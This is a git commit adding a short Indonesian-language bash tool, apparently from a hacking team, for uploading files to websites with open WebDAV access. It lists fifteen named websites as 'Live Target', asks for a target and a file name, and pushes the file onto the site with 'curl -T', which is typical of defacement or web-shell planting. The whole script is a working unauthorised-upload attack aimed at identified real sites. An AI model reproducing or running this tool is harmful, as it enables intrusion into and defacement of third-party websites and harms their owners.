23e3dc9dd1c363a46c02d5492eb7b07bc31426bc
alfaridzi344 <57557525+alfaridzi344@users.noreply.github.com>
2019-11-10 12:37:34 +0700

    Add files via upload

---
+++ webdav79.sh
@@ -0,0 +1,44 @@
+#maudiapaingblk?
+#maurecode?
+#jirkagakmauberusaha:v
+clear
+
+figlet -f slant "WEBDAV" | lolcat
+
+
+echo "========================================" | lolcat
+echo "AUTHOR:MR.4L" | lolcat
+echo "TEAM:Cyber Army Indo" | lolcat
+echo "Jenis Tolls:WEBDAV" | lolcat
+echo "PESAN:PAKAI BAIK2 KEAHLIAN LU" | lolcat
+echo "Github:https://github.com/alfaridzi344" | lolcat
+echo "instagram:alfaridzi_02 atau mr.4l_" | lolcat
+echo "kalau mau contact dm ig aja beb^_^" | lolcat
+echo "========================================" | lolcat
+sleep 3
+
+echo $blue "Live Target"
+echo $blue "http://contsol.co.za"
+echo $blue "http://colourfactory.co.za"
+echo $blue "http://chillibitez.co.za"
+echo $blue "http://chasingfantasia.com"
+echo $blue "http://centraltech.co.za"
+echo $blue "http://cblandscapes.co.za"
+echo $blue "http://crimsonmonkeyweb.com"
+echo $blue "http://kevinbutho.com"
+echo $blue "http://prorepafrica.com"
+echo $blue "http://xposurephotography.co.za"
+echo $blue "http://windmillsandporcupines.co.za"
+echo $blue "http://tcnig.co.za"
+echo $blue "http://techdirect.co.za"
+echo $blue "http://thehellenic.co.za"
+echo $blue "http://valdicare.co.za"
+sleep 5
+echo "============================================" | lolcat
+read -p "{#}TARGET LOE==>" target
+sleep 3
+read -p "{#}NAMA SCRIPT LOE==>" script
+curl -T /storage/emulated/0/$script $target
+sleep 4
+echo "Selesai!!cek web nya $target/$script "
+
